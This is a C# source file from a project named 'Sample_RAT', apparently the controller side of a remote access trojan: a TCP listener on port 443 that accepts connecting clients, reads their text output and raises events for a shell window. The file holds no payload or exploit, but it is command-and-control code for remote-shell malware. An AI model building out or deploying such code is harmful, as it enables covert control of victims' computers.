using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Windows.Forms;
using System.IO;

namespace Sample_RAT
{
    class libServer
    {
        private TcpListener server;
        public bool IsRunning { get; set; }
        winShell shellbox;

        public EventHandler<ClientsConEventArgs> OnClientConEventArgs;
        public EventHandler<TextRecivedEventArgs> OnTextRecivedEventArgs;
        public EventHandler<ClientRemoveEventArgs> OnRemoveClientEventArgs;
        public libServer()
        {

        }
        public async void OnStartServer(int Port = 443)
        {
            server = new TcpListener(IPAddress.Any, Port);
            try
            {
                server.Start();
                IsRunning = true;
                while (IsRunning)
                {
                    var Client = await server.AcceptTcpClientAsync();
                    AddShell(Client);
                    ClientsConEventArgs clientsCon = new ClientsConEventArgs(Client);
                    OnClientConEventsArgs(clientsCon);
                }

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private async void AddShell(TcpClient client)
        {
            NetworkStream stream = null;
            StreamReader streamReader = null;
            try
            {
                stream = client.GetStream();
                streamReader = new StreamReader(stream);
                char[] buff = new char[5000];
                while (IsRunning)
                {
                    int mRead = await streamReader.ReadAsync(buff, 0, buff.Length);
                    if (mRead == 0)
                    {
                        ClientRemove(client);
                        break;
                    }
                    string reciveText = new string(buff);
                    OnTextRecivedEventSArgs(new TextRecivedEventArgs(client, reciveText));
                    Array.Clear(buff, 0, buff.Length);
                }
            }
            catch (Exception ex)
            {
                ClientRemove(client);
            }
        }

        private void ClientRemove(TcpClient client)
        {
            OnRemoveClientsEventArgs(new ClientRemoveEventArgs(client));
        }

        protected virtual void OnClientConEventsArgs(ClientsConEventArgs e)
        {
            EventHandler<ClientsConEventArgs> handler = OnClientConEventArgs;
            if (handler != null)
            {
                handler(this, e);
            }
        }
        protected virtual void OnTextRecivedEventSArgs(TextRecivedEventArgs e)
        {
            EventHandler<TextRecivedEventArgs> handler = OnTextRecivedEventArgs;
            if (handler != null)
            {
                handler(this, e);
            }
        }

        protected virtual void OnRemoveClientsEventArgs(ClientRemoveEventArgs e)
        {
            EventHandler<ClientRemoveEventArgs> handler = OnRemoveClientEventArgs;
            if (handler != null)
            {
                handler(this, e);
            }
        }
    }
}
